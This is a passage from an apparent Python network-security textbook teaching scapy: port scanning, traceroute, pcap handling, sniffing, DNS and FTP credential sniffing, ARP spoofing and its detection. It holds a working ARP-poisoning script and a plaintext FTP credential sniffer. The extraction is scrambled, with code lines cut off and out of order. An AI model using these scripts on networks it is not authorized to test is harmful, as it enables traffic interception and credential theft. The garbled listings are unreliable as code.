        elif response.haslayer(TCP) and response.get
            print("Port:"+str(port)+" Closed") 
        elif response.haslayer(ICMP): 
            if(int(response.getlayer(ICMP).type)==3 
                print("Port:"+str(port)+" Filtered")
if __name__ == '__main__': 
    if len(sys.argv) !=5: 
        print("usage: %s target startport endport ve
        sys.exit(0) 
    target = str(sys.argv[1]) 
    start_port = int(sys.argv[2]) 
    end_port = int(sys.argv[3])+1 
    verbose_level = int(str(sys.argv[4])) 
    print("Scanning "+target+" for open TCP ports\n"

When executing the previous script on a speciﬁc host and a range of
ports, it checks its status for each port and displays the result on the
screen:
We also have the option to run the script and show a higher level of
detail if we use the last parameter verbose_level=1.
    for port in range(start_port,end_port): 
        analyze_port(target, port, verbose_level) 
$ sudo python scapy_port_scan.py scanme.nmap.org 20 
Scanning scanme.nmap.org for open TCP ports  
[+] Scanning port 20 
Port:20 Closed 
[+] Scanning port 21 
Port:21 Closed 
[+] Scanning port 22 
Port 22 is open! 
[+] Scanning port 23 
Port:23 Closed 
Scan complete! 
$ sudo python scapy_port_scan.py scanme.nmap.org 79 
Scanning scanme.nmap.org for open TCP ports 
 [+] Scanning port 79 
Begin emission: 
Finished sending 1 packets. 
 Received 20 packets, got 1 answers, remaining 0 pac
Port:79 Closed 

We continue to analyze the traceroute command, which can be
useful to see the route of our packets from a source IP to a
destination IP.
Traceroute with scapy
When you send packets, every packet has a TTL aĴribute. This lists
the routers the packet goes through to reach the target machine.
When a machine receives an IP packet, it decreases the TTL aĴribute
by 1 and then passes it on. If the packet’s TTL runs out before it
replies, the target machine will send an ICMP packet with a failed
message.
Scapy provides a built-in function for tracerouting as shown below:
[+] Scanning port 80 
Begin emission: 
Finished sending 1 packets. 
 Received 10 packets, got 1 answers, remaining 0 pac
Port 80 is open! 
Scan complete! 
>>> traceroute("45.33.32.156") 
Begin emission: 
Finished sending 30 packets. 
**************************** 
Received 28 packets, got 28 answers, remaining 2 pac
   45.33.32.156:tcp80  
1  192.168.18.1    11  
3  192.168.210.40  11  

Tools like traceroute send packets with a certain TTL value and
then wait for the reply before sending the next packet, which can
4  192.168.209.117 11  
6  154.54.61.129   11  
7  154.54.85.241   11  
8  154.54.82.249   11  
9  154.54.6.221    11  
10 154.54.42.165   11  
11 154.54.5.89     11  
12 154.54.41.145   11  
13 154.54.44.137   11  
14 154.54.43.70    11  
15 154.54.1.162    11  
16 38.142.11.154   11  
17 173.230.159.65  11  
18 45.33.32.156    SA  
19 45.33.32.156    SA  
20 45.33.32.156    SA  
21 45.33.32.156    SA  
22 45.33.32.156    SA  
23 45.33.32.156    SA  
24 45.33.32.156    SA  
25 45.33.32.156    SA  
26 45.33.32.156    SA  
27 45.33.32.156    SA  
28 45.33.32.156    SA  
29 45.33.32.156    SA  
30 45.33.32.156    SA  
(<Traceroute: TCP:13 UDP:0 ICMP:15 Other:0>, 
<Unanswered: TCP:2 UDP:0 ICMP:0 Other:0>) 

slow down the whole process, especially when there is a network
node that is not responsive. To simulate the traceroute command,
we could send ICMP packets and set the TTL to 30 packets, which
can reach any node on the internet.
The TTL value determines the time or number of hops a data packet
will make before a router rejects it. When you assign a TTL to your
data packet, it carries this number as a numeric value in seconds.
Every time the packet reaches a router, the router subtracts 1 from
the TTL value and passes it on to the next step in the chain:
>>> ans,unans = sr(IP(dst="45.33.32.156",ttl=(1,30))
>>> ans.summary(lambda sr:sr[1].sprintf("%IP.src%"))
192.168.18.1 
192.168.210.40 
10.10.50.51 
192.168.209.117 
154.54.61.129 
154.54.85.241 
154.54.82.249 
154.54.6.221 
154.54.42.165 
154.54.5.89 
154.54.41.145 
154.54.43.70 
38.142.11.154 
173.230.159.81 
154.54.44.137 
154.54.1.162 
45.33.32.156 

Using scapy, IP and UDP packets can be built in the following way:
To send the package, the send() function is used:
>>> send(full_packet) 
As explained above, IP packets include an aĴribute (TTL) where you
indicate the lifetime of the packet. This way, every time a device
receives an IP packet, it decreases the TTL (package lifetime) by 1
and passes it to the next machine. Basically, it is a smart way to make
sure that packets do not loop inﬁnitely.
To implement traceroute, we send a UDP packet with TTL = i for
i = 1,2,3, n and check the response packet to see whether we
have reached the destination and need to continue doing jumps for
each host that we reach. You can ﬁnd the following code in the
scapy_traceroute.py ﬁle inside the scapy folder:
>>> from scapy.all import * 
>>> ip_packet = IP(dst="google.com", ttl=10) 
>>> udp_packet = UDP(dport=40000) 
>>> full_packet = IP(dst="google.com", ttl=10) / UDP
from scapy.all import * 
host = "45.33.32.156"
for i in range(1, 20): 
    packet = IP(dst=host, ttl=i) / UDP(dport=33434) 
    # Send the packet and get a reply 

In the following output, we can see the result of executing the
traceroute script. Our target is the 45.33.32.156 IP address and we
can see the hops until we reach our target:
$ sudo python scapy_traceroute.py 
1 hops away:  192.168.18.1 
2 hops away:  10.10.50.51 
3 hops away:  192.168.210.40 
4 hops away:  192.168.209.117 
6 hops away:  154.54.61.129 
7 hops away:  154.54.85.241 
8 hops away:  154.54.82.249 
9 hops away:  154.54.6.221 
10 hops away:  154.54.42.165 
11 hops away:  154.54.5.89 
12 hops away:  154.54.41.145 
13 hops away:  154.54.44.137 
14 hops away:  154.54.43.70 
15 hops away:  154.54.1.162 
    reply = sr1(packet, verbose=0,timeout=1) 
    if reply is None: 
        pass 
    elif reply.type == 3: 
        # We've reached our destination 
        print("Done!", reply.src) 
        break 
    else: 
        # We're in the middle somewhere 
        print("%d hops away: " % i , reply.src) 

16 hops away:  38.142.11.154 
17 hops away:  173.230.159.65 
Done! 45.33.32.156 
By default, the packet is sent over the internet, but the route
followed by the packet may vary, in the event of a link failure or in
the case of changing the provider connections. Once the packets
have been sent to the access provider, the packet will be sent to the
intermediate routers that will transport it to its destination. It is also
possible that it never reaches its destination if the number of
intermediate nodes or machines is too big, and the package lifetime
expires.
Reading pcap files with scapy
In this section, you will learn the basics of reading pcap ﬁles. PCAP
(Packet CAPture) refers to the API that allows you to capture
network packets for processing. The PCAP format is standard and is
used by well-known network analysis tools such as TCPDump,
WinDump, Wireshark, TShark, and EĴercap. Scapy incorporates two
functions to work with PCAP ﬁle, which will allow us to read and
write about them:
rdcap(): Reads and loads a .pcap ﬁle.
wdcap(): Writes the contents of a list of packages in a .pcap ﬁle.
With the rdpcap() function, we can read a pcap ﬁle and get a list of
packages that can be handled directly from Python:

To see in detail the data of a packet, we can iterate over the list of
packets:
>>> for packet in packets: 
...     packet.show() 
>>> packets = rdpcap('packets.pcap') 
>>> packets.summary() 
Ether / IP / TCP 10.0.2.15:personal_agent > 10.0.2.2
Ether / IP / TCP 10.0.2.15:personal_agent > 10.0.2.2
Ether / IP / TCP 10.0.2.2:9170 > 10.0.2.15:personal_
Ether / IP / TCP 10.0.2.2:9170 > 10.0.2.15:personal_
Ether / IP / TCP 10.0.2.15:personal_agent > 10.0.2.2
….. 
>>> packets.sessions() 
{'ARP 10.0.2.2 > 10.0.2.15': <PacketList: TCP:0 UDP
'IPv6 :: > ff02::16 nh=Hop-by-Hop Option Header': <P
'IPv6 :: > ff02::1:ff12:3456 nh=ICMPv6': <PacketList
'IPv6 fe80::5054:ff:fe12:3456 > ff02::2 nh=ICMPv6': 
'ARP 10.0.2.15 > 10.0.2.2': <PacketList: TCP:0 UDP:0
'IPv6 fe80::5054:ff:fe12:3456 > ff02::16 nh=Hop-by-H
'TCP 10.0.2.2:9170 > 10.0.2.15:5555': <PacketList: T
'TCP 10.0.2.15:5555 > 10.0.2.2:9170': <PacketList: T
….. 
>>> packets.show() 
17754 Ether / IP / TCP 10.0.2.15:personal_agent > 10
17755 Ether / IP / TCP 10.0.2.15:personal_agent > 10
17756 Ether / IP / TCP 10.0.2.2:9170 > 10.0.2.15:per
17757 Ether / IP / TCP 10.0.2.2:9170 > 10.0.2.15:per
17758 Ether / IP / TCP 10.0.2.15:personal_agent > 10

###[ Ethernet ]###  
  dst       = ff:ff:ff:ff:ff:ff 
  src       = cc:00:0a:c4:00:00 
  type      = IPv4 
###[ IP ]###  
     version   = 4 
     ihl       = 5 
     tos       = 0x0 
     len       = 604 
     id        = 5 
     flags     =  
     frag      = 0 
     ttl       = 255 
     proto     = udp 
     chksum    = 0xb98c 
     src       = 0.0.0.0 
     dst       = 255.255.255.255 
It is also possible to access the packet as if it were an array or list
data structure:
>>> len(packets) 
12 
>>> print(packets[0].show()) 
###[ Ethernet ]###  
  dst       = ff:ff:ff:ff:ff:ff 
  src       = cc:00:0a:c4:00:00 
  type      = IPv4 
###[ IP ]###  
     version   = 4 
     ihl       = 5 

     tos       = 0x0 
     len       = 604 
     id        = 5 
     flags     =  
     frag      = 0 
     ttl       = 255 
     proto     = udp 
     chksum    = 0xb98c 
     src       = 0.0.0.0 
     dst       = 255.255.255.255 
The following method get_packet_layer(packet) allows us to
obtain the layers of a packet:
>>> def get_packet_layer(packet): 
...     yield packet.name 
...     while packet.payload: 
...             packet = packet.payload 
...             yield packet.name 
>>> for packet in packets: 
...     layers = list(get_packet_layer(packet)) 
...     print("/".join(layers)) 
...  
Ethernet/IP/UDP/BOOTP/DHCP options 
............. 
Read DHCP requests
Many routers use the Dynamic Host Conﬁguration Protocol
(DHCP) protocol to automatically assign IP addresses to network

devices. In DHCP, the DHCP client (network device) ﬁrst sends a
DHCP discover message to all destinations (broadcasts) on the
Local Address Network (LAN) to query the DHCP server
(broadband router).
At the following URL,
https://www.cloudshark.org/captures/0009d5398f37, you can
get an example of capture ﬁle with DHCP requests.
Figure 5.3: DHCP requests
In many cases, the options in the DHCP discover message include
the host name of the client. Our goal is to extract the client and
server identiﬁers. You can ﬁnd the following code in the
scapy_dhcp_discover_host.py ﬁle inside the scapy folder:

In the above code, we read the DHCP packets from the ﬁle to extract
the client and server identiﬁers for each packet. You can ﬁnd the
following code in the scapy_read_dhcp_pcap.py ﬁle.
from scapy.all import * 
from collections import Counter 
from prettytable import PrettyTable 
packets = rdpcap('packets_DHCP.cap') 
srcIP=[] 
for packet in packets: 
    if IP in packet: 
        try: 
            srcIP.append(packet[IP].src) 
        except: 
from scapy.all import * 
pcap_path = "packets_DHCP.cap" 
packets = rdpcap(pcap_path) 
for packet in packets: 
    try: 
        packet.show() 
        options = packet[DHCP].options 
        for option in options: 
            if option[0] == 'client_id': 
                client_id = option[1].decode() 
            if option[0] == 'server_id': 
                server_id = option[1] 
                print('ServerID: {} | ClientID: {}'
    except IndexError as error: 
        print(error) 

            pass 
counter=Counter() 
for ip in srcIP: 
    counter[ip] += 1 
table= PrettyTable(["IP", "Count"]) 
for ip, count in counter.most_common(): 
    table.add_row([ip, count]) 
print(table) 
In the previous code, we ﬁrst tell scapy to read all of the packets in
the PCAP to a list, using the rdpcap function. Packets in scapy have
elements; we will only be dealing with packets’ IP data. Each packet
has aĴributes like the source IP, destination IP, source port,
destination port, bytes, etc.
The previous script uses a Python module called preĴytable, which
you can install with the following command:
$ pip install PrettyTable 
When executing the previous script, we can see a table with a
summary about IP addresses and a count for each one:
$ sudo python read_pcap.py 
+-------------+-------+ 
|      IP     | Count | 
+-------------+-------+ 
| 192.168.0.1 |   6   | 
| 192.168.0.3 |   4   | 

|   0.0.0.0   |   2   | 
+-------------+-------+ 
In the previous example, we read a PCAP ﬁle and store the source IP
in a list. To do that, we will loop through the packets using a
try/except block as not every packet will have the information we
want. Now that we have a list of IPs from the packets, we will use a
counter to create a count. Next, we will loop through the data and
add them to the table from highest to lowest.
Writing a pcap file
With the wrpcap() function, we can store the captured packets in a
pcap ﬁle. In the following example, we capture TCP packets for
HTTP transmissions on port 80 and save these packets in a pcap ﬁle.
You can ﬁnd the following code in the
scapy_write_packets_filter.py ﬁle inside the scapy folder:
from scapy.all import * 
def sniffPackets(packet): 
    if packet.haslayer(IP): 
        ip_layer = packet.getlayer(IP) 
        packet_src=ip_layer.src 
        packet_dst=ip_layer.dst 
        print("[+] New Packet: {src} -> {dst}".forma
if __name__ == '__main__': 
    interfaces = get_if_list() 
    print(interfaces) 
    for interface in interfaces: 

When executing the previous script, we capture the ﬁrst 100 packets
that have destination ports 80 or 443 for the selected network
interface and the results are stored in the packets.pcap ﬁle.
Packet-sniffing with scapy
One of the features oﬀered by scapy is to sniﬀ the network packets
passing through an interface. Let’s create a simple Python script to
sniﬀ traﬃc on your local machine network interface. Scapy provides
a method to sniﬀ packets and dissect their contents:
With the sniff function, we can capture packets in the same way
that tools such as tcpdump or Wireshark do, indicating the network
interface from which we want to collect the generated traﬃc and a
counter that indicates the number of packets we want to capture:
>>> packets = sniff (iface = "wlo1", count = 3) 
    print(interface) 
    interface = input("Enter interface name to sniff
    print("Sniffing interface " + interface) 
    packets = sniff(iface=interface,filter="tcp and 
    wrpcap('packets.pcap',packets) 
>>> sniff(filter="",iface="any",prn=function,count=N

Now we are going to see each parameter of the sniff function in
detail. The arguments for the sniff() method are as follows:
>>> help(sniff) 
Help on function sniff in module scapy.sendrecv: 
sniff(*args, **kwargs) 
    Sniff packets and return a list of packets. 
    Args: 
        count: number of packets to capture. 0 means
        store: whether to store sniffed packets or d
        prn: function to apply to each packet. If so
             is displayed. 
             --Ex: prn = lambda x: x.summary() 
        session: a session = a flow decoder used to 
                 --Ex: session=TCPSession 
                 See below for more details. 
        filter: BPF filter to apply. 
        lfilter: Python function applied to each pac
                 further action may be done. 
                 --Ex: lfilter = lambda x: x.haslaye
        offline: PCAP file (or list of PCAP files) t
                 instead of sniffing them 
        quiet:   when set to True, the process stder
                 (default: False). 
        timeout: stop sniffing after a given time (d
        L2socket: use the provided L2socket (default
        opened_socket: provide an object (or a list 
                      .recv() on. 
        stop_filter: Python function applied to each
                     we have to stop the capture aft
                     --Ex: stop_filter = lambda x: x

Among the above parameters, we can highlight the prn parameter,
which provides the function to apply to each packet. This parameter
will be present in many other functions and refers to a function as an
input parameter. In the case of the sniff() function, this function
will be applied to each captured packet.
This way, every time the sniff() function intercepts a packet, it
will call this function with the intercepted packet as a parameter.
This functionality gives us great power; for example, we could build
a script that intercepts all communications and stores all detected
hosts in the network:
Scapy also supports the Berkeley Packet Filter (BPF) format. It is a
standard format to apply ﬁlters over network packets. These ﬁlters
can be applied to a set of speciﬁc packages or directly to an active
capture. We can format the output of sniff() in such a way that it
adapts just to the data we want to see. We are going to capture traﬃc
HTTP and HTTPS with the "tcp and (port 443 or port 80)"
>>> packets = sniff(filter="tcp", iface="wlo1", prn=
Ether / IP / TCP 52.16.152.198:https > 192.168.18.21
Ether / IP / TCP 52.16.152.198:https > 192.168.18.21
Ether / IP / TCP 52.16.152.198:https > 192.168.18.21
Ether / IP / TCP 192.168.18.21:34662 > 52.16.152.198
Ether / IP / TCP 192.168.18.21:54230 > 54.78.134.154
...

activated ﬁlter and by using prn = lamba x: x.sprintf, we can
print the packets with the following format:
Source IP and origin port
Destination IP and destination port
TCP Flags
Payload of the TCP segment
In the following example, we use the sniff() method, and the prn
parameter speciﬁes the previous format. You can ﬁnd the following
code in the sniff_packets_filter.py ﬁle inside the scapy folder.
In the following example, we use the sniff() method, which takes
as a parameter the interface on which you want to capture the
packets, and the ﬁlter parameter is used to specify which packets
you want to ﬁlter. The prn parameter speciﬁes which function to
call and sends the packet as a parameter to the function. In this case,
our custom function is called sniffPackets(). You can ﬁnd the
from scapy.all import * 
if __name__ == '__main__': 
    interfaces = get_if_list() 
    print(interfaces) 
    for interface in interfaces: 
        print(interface) 
    interface = input("Enter interface name to sniff
    print("Sniffing interface " + interface) 
    sniff(iface=interface,filter="tcp and (port 443 
    prn=lambda x:x.sprintf("%.time% %-15s,IP.src% ->

following code in the sniff_packets_filter_function.py ﬁle
inside the scapy folder:
In the previous code with the sniffPackets() function, we check
whether the sniﬀed packet has an IP layer; if it has an IP layer, then
we store the source, destination, and TTL values of the sniﬀed packet
and print them out.
Using the haslayer() method, we can check if a packet has a
speciﬁc layer. In the following example, we are comparing if the
packet has the same IP layer, and the destination IP or source IP is
equal to the IP address, inside the packets we are capturing.
from scapy.all import * 
def sniffPackets(packet): 
    if packet.haslayer(IP): 
        ip_layer = packet.getlayer(IP) 
        packet_src=ip_layer.src 
        packet_dst=ip_layer.dst 
        print("[+] New Packet: {src} -> {dst}".forma
if __name__ == '__main__': 
    interfaces = get_if_list() 
    print(interfaces) 
    for interface in interfaces: 
        print(interface) 
    interface = input("Enter interface name to sniff
    print("Sniffing interface " + interface) 
    sniff(iface=interface,filter="tcp and (port 443 

>>> ip = "192.168.0.1"
>>> for packet in packets: 
>>>    if packet.haslayer(IP): 
>>>        src = packet[IP].src 
>>>        dst = packet[IP].dst 
>>>        if (ip == dst) or (ip == src): 
>>>            print("matched ip") 
In the following example, we see how we can apply custom actions
to captured packets. We deﬁne a customAction() method, which
takes a packet as a parameter. For each packet captured by the
sniff() function, we call this method and increment the
packetCount variable. You can ﬁnd the following code in the
sniff_packets_customAction.py ﬁle inside the scapy folder:
By running the above script, we can see the packet number along
with the source and destination IP addresses.
$ sudo python sniff_packets_customAction.py 
1 192.168.18.21 → 151.101.134.49 
from scapy.all import * 
packetCount = 0
def customAction(packet): 
    global packetCount 
    packetCount += 1 
    return "{} {} → {}".format(packetCount, packet[0
sniff(filter="ip",prn=customAction) 

2 192.168.18.21 → 18.202.191.241 
3 192.168.18.21 → 151.101.133.181 
4 192.168.18.21 → 13.248.245.213 
…......... 
We continue by analyzing the ARP packets that are exchanged on an
interface. The Address Resolution Protocol (ARP) is a protocol that
communicates with hardware interfaces at the data link layer and
provides services to the upper layer.
Note the presence of the ARP table that is used to resolve an IP
address to a MAC address to ensure communication with this
machine. At this point, we could monitor ARP packets with the
sniff() function and arp ﬁlter. You can ﬁnd the following code in
the sniff_packets_arp.py ﬁle inside the scapy folder:
By executing the arp -help command, we can see the options that
it provides:
from scapy.all import * 
def arpDisplay(packet): 
    if packet.haslayer(ARP): 
        if packet[ARP].op == 1: #request 
            print("Request: {} is asking about {}".f
        if packet[ARP].op == 2: #response 
            print("Response: {} has MAC address {}"
sniff(iface="wlo1",prn=arpDisplay, filter="arp", sto

With the following commands, we display all hosts where we can
see the MAC and IP addresses from the speciﬁed interface:
$ arp -help 
Usage: 
  arp [-vn]  [<HW>] [-i <if>] [-a] [<hostname>]     
  arp [-v]          [-i <if>] -d  <host> [pub]      
  arp [-vnD] [<HW>] [-i <if>] -f  [<filename>]      
  arp [-v]   [<HW>] [-i <if>] -s  <host> <hwaddr> [t
  arp [-v]   [<HW>] [-i <if>] -Ds <host> <if> [netma
        -a                       display (all) hosts
        -e                       display (all) hosts
        -s, --set                set a new ARP entry
        -d, --delete             delete a specified 
        -v, --verbose            be verbose 
        -n, --numeric            don't resolve names
        -i, --device             specify network int
        -D, --use-device         read <hwaddr> from 
        -A, -p, --protocol       specify protocol fa
        -f, --file               read new entries fr
  
  <HW>=Use '-H <hw>' to specify hardware address typ
  List of possible hardware types (which support ARP
    ash (Ash) ether (Ethernet) ax25 (AMPR AX.25)  
    netrom (AMPR NET/ROM) rose (AMPR ROSE) arcnet (A
    dlci (Frame Relay DLCI) fddi (Fiber Distributed 
    irda (IrLAP) x25 (generic X.25) infiniband (Infi
    eui64 (Generic EUI-64) 

By running the above script, we can see the arp requests and
responses:
In the following example, we see how to deﬁne the function that will
be executed every time a packet of type UDP is obtained when
making a DNS request. You can ﬁnd the following code in the
sniff_packets_DNS.py ﬁle inside the scapy folder.
In the previous code, we deﬁne the count_dns_request(packet)
method, which is called when scapy ﬁnds a packet with the UDP
$ arp -e  
Address                  HWtype  HWaddress          
_gateway                 ether   f4:1d:6b:dd:14:d0  
$ arp -a  
_gateway (192.168.18.1) at f4:1d:6b:dd:14:d0 [ether]
$ sudo python sniff_packets_arp.py 
Request: 192.168.18.1 is asking about 192.168.18.21 
Response: a4:4e:31:d8:c2:80 has MAC address 192.168
from scapy.all import * 
def count_dns_request(packet): 
    if DNSQR in packet: 
        print(packet.summary()) 
        print(packet.show()) 
sniff(filter="udp and port 53",prn=count_dns_request

protocol and port 53. This method checks whether the packet is a
DNS request. In this case, it shows information about the packet
with the summary() and show() methods. When executing the
previous script, we can see DNS packets and for each packet we see
information about the Ethernet, IP UDO, and DNS layers.
$ sudo python sniff_packets_DNS.py 
Ether / IP / UDP / DNS Ans "b'ukc-word-edit.wac.traf
###[ Ethernet ]###  
  dst       = a4:4e:31:d8:c2:80 
  src       = f4:1d:6b:dd:14:d0 
  type      = IPv4 
###[ IP ]###  
     version   = 4 
     ihl       = 5 
     tos       = 0x0 
     len       = 221 
     id        = 35150 
     flags     = DF 
     frag      = 0 
     ttl       = 64 
     proto     = udp 
     chksum    = 0xb5b 
     src       = 192.168.18.1 
     dst       = 192.168.18.21 
     \options   \ 
###[ UDP ]###  
        sport     = domain 
        dport     = 51191 
        len       = 201 

        chksum    = 0xe7e0 
###[ DNS ]###  
           id        = 2958 
           qr        = 1 
           opcode    = QUERY 
           aa        = 0 
           tc        = 0 
           rd        = 1 
           ra        = 1 
           z         = 0 
           ad        = 0 
           cd        = 0 
           rcode     = ok 
           qdcount   = 1 
           ancount   = 3 
           nscount   = 0 
           arcount   = 0 
           \qd        \ 
            |###[ DNS Question Record ]###  
            |  qname     = 'ukc-word-edit.officeapps
            |  qtype     = A 
            |  qclass    = IN 
           \an        \ 
            |###[ DNS Resource Record ]###  
            |  rrname    = 'ukc-word-edit.officeapps
            |  type      = CNAME 
            |  rclass    = IN 
            |  ttl       = 178 
            |  rdlen     = None 
            |  rdata     = 'ukc-word-edit.wac.traffi
            |###[ DNS Resource Record ]###  
            |  rrname    = 'ukc-word-edit.wac.traffi
|

We could improve the previous script to capture DNS packets and
get those domains that have been queried. The following script
contains the network analyzer implementation, which captures all
DNS requests and returns a list of domains. You can ﬁnd the
following code in the scapy_dns_sniffer.py ﬁle inside the scapy
folder:
            |  type      = CNAME 
            |  rclass    = IN 
            |  ttl       = 29 
            |  rdlen     = None 
            |  rdata     = 'b-0016.b-msedge.net.' 
            |###[ DNS Resource Record ]###  
            |  rrname    = 'b-0016.b-msedge.net.' 
            |  type      = A 
            |  rclass    = IN 
            |  ttl       = 145 
            |  rdlen     = None 
            |  rdata     = 13.107.6.171 
           ns        = None 
           ar        = None 
from scapy.all import sniff, DNSQR 
number_dns_queries = 0 
dns_domains = [] 
def count_dns_request(packet): 
    global number_dns_queries 
    if DNSQR in packet: 
        number_dns_queries += 1 

In the above code, we count the DNS packets and store the result in
a global variable number_dns_queries. We also store in the
dns_domains list the name of the nameservers that we get by
accessing each packet’s name aĴribute.
We continue with the main program where we use the sniff()
method to capture UDP-type packets on port 53. Once the capture is
ﬁnished, we show the results that we have stored in the global
variables mentioned above.
        if packet[DNSQR].qname not in dns_domains: 
            dns_domains.append(packet[DNSQR].qname) 
def main(): 
    print("[*] Executing DNS sniffer...") 
    print("[*] Stop the program with Ctrl+C and view
    try: 
        a = sniff(filter="udp and port 53", prn=coun
    except KeyboardInterrupt: 
        pass 
    print("[*] Sniffer stopped. Showing results") 
    print("Number dns queries:",number_dns_queries) 
    print("[+] Domains:") 
    for domain in dns_domains: 
        print(domain.decode()) 
if __name__ == '__main__': 
    main() 

For the execution of the previous code, the reader must stop it with
the keystroke combination Ctrl+C to see the DNS queries printed to
the console.
Network forensics with scapy
Scapy is also useful to perform network forensics from SQL injection
aĴacks or extract FTP credentials from a server. With the help of the
Python scapy module, we can analyze the network packets to
identify when/where/how an aĴacker performs this kind of aĴack.
For example, we could develop a simple script to detect FTP user
credentials when logging in with the FTP server. You can ﬁnd the
$ sudo python scapy_dns_sniffer.py 
[*] Executing DNS sniffer... 
[*] Stop the program with Ctrl+C and view the result
^C [*] Sniffer stopped. Showing results 
Number dns queries: 186 
[+] Domains: 
signaler-pa.clients6.google.com. 
Api.swapcard.com. 
ukc-word-edit.officeapps.live.com. 
Browser.events.data.microsoft.com. 
Incoming.telemetry.mozilla.org. 
contile-images.services.mozilla.com. 
Docs.google.com. 
........... 

following code in the scapy_ftp_sniffer.py ﬁle inside the scapy
folder:
To extract the connection credentials to an FTP server, we are
creating a helper function to check if the packet includes the port in
the speciﬁed transport layer. If it is a packet associated with port 21
and uses TCP, we check the plain text data related to the user and
the password.
In our main program, we conﬁgure the necessary parameters for the
execution of the script, and we use the sniff() function to ﬁlter the
TCP packets on port 21 corresponding to the FTP service:
import re 
import argparse 
from scapy.all import sniff, conf 
from scapy.layers.inet import IP 
def ftp_sniff(packet): 
    dest = packet.getlayer(IP).dst 
    raw = packet.sprintf('%Raw.load%') 
    print(raw) 
    user = re.findall(f'(?i)USER (.*)', raw) 
    password = re.findall(f'(?i)PASS (.*)', raw) 
    if user: 
        print(f'[*] Detected FTP Login to {str(dest)
        print(f'[+] User account: {str(user[0])}') 
    if password: 
        print(f'[+] Password: {str(password[0])}') 

To test the previous script, we can capture packets in the selected
interface and connect to the FTP server at the same time:
$ sudo python scapy_ftp_sniffer.py wlo1 
'USER anonymous\r\n' 
[*] Detected FTP Login to 64.50.236.52 
[+] User account: anonymous\r\n' 
?? 
'331 Please specify the password.\r\n' 
?? 
'PASS \r\n' 
[+] Password: \r\n' 
'230 Login successful.\r\n' 
$ ftp ftp.us.debian.org 
ftp: Trying 64.50.236.52 ... 
Connected to ftp.us.debian.org. 
Name (ftp.us.debian.org:linux): anonymous 
331 Please specify the password. 
Password:  
230 Login successful. 
if __name__ == '__main__': 
    parser = argparse.ArgumentParser(usage='python3 
    parser.add_argument('interface', type=str, metav
                        help='specify the interface 
    args = parser.parse_args() 
    try: 
        sniff(iface=args.interface,filter='tcp port 
    except KeyboardInterrupt: 
        exit(0) 

Remote system type is UNIX. 
Using binary mode to transfer files. 
Working with scapy to detect ARP
spoofing attacks
ARP spooﬁng, also known as ARP poisoning, is a type of aĴack in
which a malicious user sends forged ARP messages over a LAN.
This results in matching an aĴacker’s MAC address to the IP address
of a legitimate computer or server on a network.
This aĴack allows us to poison our victim’s ARP cache tables and to
execute aĴacks such as Man in the Middle (MITM), Denial of
Service (DoS) or Session Hijacking among other techniques.
This aĴack consists of sending false ARP messages and the purpose
is to associate the aĴacker’s MAC address with the IP address of
another node, such as the default gateway. The aim is to send a
packet to the victim’s computer (referenced by the IP and MAC
addresses), associating the gateway IP with our MAC address (the
aĴacking computer). As a result, the ARP tables of the victim
computer are modiﬁed with the MAC addresses of the aĴacking
computer.
Among the main elements involved in this aĴack, we can highlight:
The source IP address (psrc)
The destination IP address (pdst)
The source MAC address (hwsrc)
The destination MAC address (hwdst)

In the following script, we implement ARP spooﬁng, where we
request the target and gateway IP addresses. From these, IP
addresses we get source and destination MAC addresses. Finally, we
implement the arp_spoofing() method to send ARP requests. You
can ﬁnd the following code in the scapy_arp_spoofing.py ﬁle
inside the scapy folder:
We will continue with how we can detect these type of aĴacks using
scapy.
from scapy.all import * 
def get_mac_address(ip_address): 
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request = ARP(pdst=ip_address) 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = srp(arp_request_broadcast,timeou
    return answered_list[0][0][1].hwsrc 
def arp_spoofing(target_ip,gateway_ip,target_mac,gat
    packet = ARP(op=2,pdst=target_ip,hwdst=target_ma
    send(packet, count=2, verbose=False) 
    packet = ARP(op=2,pdst=gateway_ip,hwdst=gateway_
    send(packet, count=2, verbose=False) 
if __name__ == '__main__': 
    target_ip = input("Enter Target IP:") 
    gateway_ip = input("Enter Gateway IP:") 
    target_mac = get_mac_address(target_ip) 
    gateway_mac = get_mac_address(gateway_ip) 
    arp_spoofing(target_ip,gateway_ip,target_mac,gat

Detection of false ARP attacks using
Scapy
Our script will have the capacity to detect if some packet has a
spoofed ARP layer. The sniff() function will take a callback to
apply to each packet that will be sniﬀed. With the argument store
= False, we tell the sniff() function to discard sniﬀed packets
instead of storing them in memory, which is useful when the script
runs for a long time.
We can use the following command to check the interface of the
machine you want to sniﬀ:
To ﬁnd out if there is ARP spooﬁng, the MAC of the response is
compared with the original MAC. If they are not equals, it means an
ARP spooﬁng aĴack is producing:
>>> conf.iface 
<NetworkInterface wlo1 [UP+BROADCAST+RUNNING+SLAVE]>
>>> for packet in packets: 
>>>  if packet[ARP].op == 2: 
>>>    real_mac = packet[ARP].psrc 
>>>    response_mac = packet[ARP].hwsrc 
>>>    if real_mac != response_mac: 
>>>      print("[+]ARP Spoofing detected: ",packet[A

We can start creating a function that, given an IP address, gets the
MAC address. For this, we can make an ARP request using the ARP
function and obtain the MAC address for a given IP address. In this
function, what we do is set the broadcast MAC address to "ff: ff:
ff: ff: ff: ff" using the Ether function. To get the MAC
address, we can use the srp() method and access the hwsrc ﬁeld of
the result returned by this function. You can ﬁnd the following code
in the scapy_arp_sniffer.py ﬁle inside the scapy folder.
In the previous code, we deﬁne a process_sniffed_packet()
method to process a sniﬀed packet. This method has the capacity to
import scapy.all as scapy 
def sniff(interface): 
    scapy.sniff(iface=interface, store=False, prn=pr
def get_mac_address(ip_address): 
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff") 
    arp_request = ARP(pdst=ip_address) 
    arp_request_broadcast = broadcast / arp_request 
    answered_list = srp(arp_request_broadcast,timeou
    return answered_list[0][0][1].hwsrc 
def process_sniffed_packet(packet): 
    if packet.haslayer(scapy.ARP) and packet[scapy.A
        originalmac = get_mac_address(packet[scapy.A
        responsemac = packet[scapy.ARP].hwsrc 
        if originalmac != responsemac: 
            print("[*] ALERT!!! You are under attack
if __name__ == '__main__': 
    sniff("wlo1") 

check if the packet is an ARP packet or if it is an ARP response.
When checking if our network is suﬀering an aĴack of this type, the
objective is to compare the original MAC address with the MAC of
the response. If they are diﬀerent, that means that ARP spooﬁng has
occurred due to a change in the ARP table.
Applied to the ﬁeld of computer security, these tools allows us to
carry out scans and/or network aĴacks. The main advantage of scapy
is that it provides us with the ability to modify network packets at a
low level, allowing us to use existing network protocols and
parameterize them based on our needs.
Summary
